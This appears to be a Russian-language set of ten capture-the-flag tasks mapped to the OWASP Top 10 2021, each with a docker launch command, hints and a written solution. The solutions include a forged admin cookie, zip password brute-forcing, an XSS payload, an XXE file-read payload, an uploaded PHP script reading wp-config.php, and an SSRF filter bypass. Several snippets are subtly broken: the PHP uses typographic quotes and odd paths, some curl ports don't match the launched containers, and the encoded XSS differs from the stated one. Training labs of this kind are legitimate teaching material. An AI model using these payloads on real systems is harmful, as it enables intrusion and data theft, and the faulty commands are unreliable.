1 Broken Access Control
Описание: Я нашел интересный сайт, но никак не могу найти то, что мне нужно. Возможно нужно спросить у админа?
Запуск: docker run -d -p 1000:1000 bac_rate 

localhost:1000

Подсказка 1:
Обратите внимание на информацию, хранящуюся в куки после регистрации.
Подсказка 2:
Попробуйте изменить содержимое куки, чтобы увидеть, что произойдет.
Решение: Регистрируемся и видим, что роль пользователя хранится в куки в виде base64. Зашифровываем "admin" в base64 и вставляем в куки: role = YWRtaW4= (role = admin). Обновляем страницу и видим флаг для админа.

2. A02:2021-Cryptographic Failures
Описание: Мы нашли на сайте секретный архив secret.zip, защищенный паролем! Помоги нам узнать секреты которые скрывает от нас компания...
Запуск: secret.zip

Подсказка 1:
Возможно, пароль для архива не очень длинный. От 4 до 6 символов
Подсказка 2: Пароль состоит из букв нижнего регистра.
Решение: брутфорс пароля
	fcrackzip -v -u -b -c 'a' -l 4-6 secret.zip
			или
	zip2john secret.zip > hash.txt
	john --format=PKZIP --incremental=Alpha hash.txt

3. A03:2021-Injection   
Описание: Сайт, который поздравляет тебя с днем рождения, это круто, но еще круче сайт с XSS
Запуск: docker run -p 2000:2000 xsss

localhost:2000

Подсказка 1: 
Используйте XSS.
Подсказка 2: 
Используйте URL encoding.
Решение: XSS в URL encoding. Переходим на либой веб-сервис для шифровки в URL encoding. Зашифровывем наш XSS "<script>alert(1)</script>".
Пример - %3Cscript%3Ealert%28%221%22%29%3C%2Fscript%3E
Вставляем в поле ввода полученный результат. 

4. A04:2021-Insecure Design 
Описание: Красивая страница авторизации, может быть не такой безопасной...
Запуск: docker run -p 80:80 insecure_design

localhost:80

Подсказка 1: 
Посмотрите на исходный код страницы.
Подсказка 2: 
Ищите что-то необычное или скрытое в коде страницы.
Решение: Посмотреть код страницы и найти в нем флаг

5. A05:2021-Security Misconfiguration 
Запуск: docker run -d -p 4000:4000 sec_misconfig

localhost:4000

Подсказка 1:
Обратите внимание на возможности загрузки файлов на сайт.
Подсказка 2:
Попробуйте отправить файл, содержащий специфическую XML структуру, чтобы открыть файл "file:///flag".
Решение: 
Создаем файл solution.xml:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<root>
    <firstname>John</firstname>
    <phonenumber>1234567890</phonenumber>
    <emailadd>&xxe;</emailadd>
</root>
И отправляем его POST запросом:
$curl -X POST -d @solution.xml http://localhost:8080/xxe.php --header "Content-Type: text/xml"

6. A06:2021-Vulnerable and Outdated Components
Описание: Джон постоянно твердит всем, что он такой хороший fullstack сисадмин devop, но вы преподадите ему урок. Пристыдите его, узнав пароль к базе данных сайта.
admin user credentials are NJDZgw$K0lR0bK9R%*
Запуск: sudo docker-compose up --build

localhost:30100

Подсказка 1:
Изучите известные пути, связанные с WordPress установками.
Подсказка 2:
Ищите возможность загрузки файлов на сайт.
Решение:
Быстрый просмотр известных путей Wordpress, присутствующих в любой инсталляции, обнаружит каталог /wp-content/plugins, который, по совпадению, является распространенным источником проблем.
Вы сразу же заметите файл upload.html, который позволяет загружать файлы без ограничений по содержимому и расширению файлов и выводит обратно место, куда файл был скопирован, прямо в корень документа.
Вам просто нужно загрузить PHP-файл, который читает файл wp-config.php и считывает содержимое переменной DB_PASSWORD. Вы можете легко сделать это с помощью этого файла:

<?php
echo file_get_contents(«.../.../wp-config.php»);
?>

Затем просто зайдите в загруженный файл, что-то вроде /uploads/hiden_<random_id1>/<random_id2>.php и просмотрите источник страницы.

7. A07:2021-Identification and Authentication Failures 
Описание: Ты агент под прикрытием, работающий на секретную организацию. Твоя миссия: взломать систему аутентификации и получить доступ к тайным данным. Но будь осторожен, система охраняется опытными программистами, которые считают, что их защита непробиваема, а код идеален...
Запуск: docker run -p 5000:5000 ctf-auth-failure

localhost:5000

Подсказка 1:
Поищите исходный код системы аутентификации.
Подсказка 2:
Найдите хэш пароля и попытайтесь его расшифровать.
Решение: Переходим в директорию /source и находим хэш пароля админа, расшифровываем его. Узнаем, что пароль это secret и заходим с его помощью.

8. A08:2021-Software and Data Integrity Failures
Описание: В вашем распоряжении оказалась информация о том, что таинственная организация "Data Keepers" разработала систему, которая позволяет проверять целостность загружаемых файлов. Ваша задача - проникнуть в эту систему, обойти её механизмы защиты и получить секретный флаг.
Запуск: docker-compose up -d --build

localhost:6000

Подсказка 1:
Внимательно изучите главную страницу и страницу загрузки файлов.
Подсказка 2:
Обратите внимание на использование MD5 хэшей.
Решение: Откройте главную страницу CTF челленджа.
Перейдите на страницу загрузки файлов.
Обратите внимание на подсказку и найдите MD5 хэш.
Создайте файл solution.txt с содержимым "hello".

import hashlib

hash_object = hashlib.md5(b'hello')
print(hash_object.hexdigest())

echo -n "hello" > solution.txt

Загрузите файл на сервер.

9. A09:2021-Security Logging and Monitoring Failures
Описание: Вы — член элитной команды хакеров, известной своими успешными взломами и исследованиями уязвимостей. Недавно ваша команда получила доступ к сети крупной корпорации, известной своими высокими стандартами безопасности. Однако, проникнув в их защищенную среду, вы обнаружили серьезные проблемы с мониторингом и логированием безопасности.
Запуск: docker run -p 7000:7000 logging

localhost:7000

Подсказка 1:
Изучите доступные директории с логами.
Подсказка 2:
Попробуйте найти логин и пароль администратора в логах.
Решение: Пользователь находит директорию /logs, в ней он находит логин и пароль админа и информацию о том, что он переходил в директорию /secret_logs, доступную только ему. Пользователь авторизуется с кредами админа и переходит в секретные логи, где есть запись о создании файла flag.txt и его значение в base64, он его декодирует и получает готовый флаг.

10. A10:2021-Server-Side Request Forgery 
Описание: Вы член группы хакеров, известной своими уникальными методами взлома. Ваша следующая цель — использовать уязвимость Server-Side Request Forgery (SSRF) для доступа к защищенному флагу, который находится на внутреннем сервере.
RUN: docker run -p 9000:9000 ssrf

localhost:9000

Подсказка 1:
Попробуйте различные способы представления IP адресов для обхода фильтров.
Подсказка 2:
Используйте известные трюки для обхода фильтрации локальных адресов. Порт - 1729
*Подсказка относится к "Такси Харди" - знаменитому математическому анекдоту, связанному с числом 1729.
Решение:
Веб-приложение фильтрует запросы к локальным адресам и некоторым известным форматам, таким как localhost, 127.0.0.1, 0.0.0.0 и их эквивалентам в различных форматах.
Используйте различные способы представления IP адресов (127.0.0.1, 0.0.0.0, 2130706433, 0x7f000001 и т.д.) для обхода фильтров.
curl -X POST -d 'url=http://2130706433:1729/' http://localhost:2000/proxy



